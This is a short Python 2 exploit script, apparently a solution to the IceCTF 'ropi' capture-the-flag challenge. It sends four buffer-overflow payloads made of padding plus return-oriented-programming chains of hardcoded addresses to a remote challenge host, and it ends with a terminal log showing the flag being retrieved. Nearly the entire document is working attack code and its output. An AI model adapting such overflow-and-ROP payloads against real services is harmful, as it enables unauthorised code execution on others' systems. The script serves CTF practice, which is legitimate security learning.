#!/usr/bin/python
import sys
import socket


def adr_to_str16(add):
    a = hex(add + 0x1000000000000000)
    ret  = chr(int(a[16:18], 16))
    ret += chr(int(a[14:16], 16))
    ret += chr(int(a[12:14], 16))
    ret += chr(int(a[10:12], 16))
    return ret



ORI=adr_to_str16(0x080485c4)
AG2=adr_to_str16(0xabcdefff)
AG3=adr_to_str16(0x78563412)
RET=adr_to_str16(0x08048569)
AG1=adr_to_str16(0xbadbeeef)
EZY=adr_to_str16(0x0804852d)
PP1=adr_to_str16(0x08048395)
PP2=adr_to_str16(0x080486ee)
PRO=adr_to_str16(0x0804862c)
FIN=adr_to_str16(0x08048400)
pile1=RET+PP1+AG1+EZY
pile1=44*"A"+pile1+"AAAA"
# cette pile de longueur 0x40 = 64 va enchainer ret(AG1) puis ezy()
# cette pile va enchainer  ori(AG2,AG3)
pile2=ORI+PP2+AG2+AG3+EZY
pile2=44*"A"+pile2
pile3=PRO+EZY*4
pile3=44*"A"+pile3
pile4=44*"A"+FIN*5


HOST = "ropi.vuln.icec.tf"
PORT = 6500
s = socket.socket()
s.connect((HOST, PORT))
readbuffer=s.recv(1024)
print readbuffer
s.send(pile1)
readbuffer=s.recv(1024)
print readbuffer
s.send(pile2)
readbuffer=s.recv(1024)
print readbuffer
s.send(pile3)
readbuffer=s.recv(1024)
print readbuffer
s.send(pile4)
readbuffer=s.recv(1024)
print readbuffer
s.close()

# francois@athos:~/tmp/Gh/C2$ python p.py 
# Benvenuti al convegno RetOri Pro!
# Vuole lasciare un messaggio?
# 
# [+] aperto
# 
# Benvenuti al convegno RetOri Pro!
# Vuole lasciare un messaggio?
# 
# [+] leggi
# Benvenuti al convegno RetOri Pro!
# Vuole lasciare un messaggio?
# 
# [+] stampare
# IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}
# Benvenuti al convegno RetOri Pro!
# Vuole lasciare un messaggio?
# 
# francois@athos:~/tmp/Gh/C2$ 
